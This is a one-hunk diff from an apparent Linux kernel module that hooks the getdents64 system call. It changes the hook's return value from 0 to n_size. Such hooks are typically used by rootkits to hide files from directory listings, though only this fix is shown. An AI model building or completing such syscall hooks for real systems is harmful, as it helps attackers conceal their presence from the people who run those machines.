@@ -36,7 +36,7 @@ asmlinkage int hooked_getdents64(const struct pt_regs *regs)
 
         kfree(direntry_final);                          //<- Free the final direntry
 
-        return 0;
+        return n_size;
 }
 
 
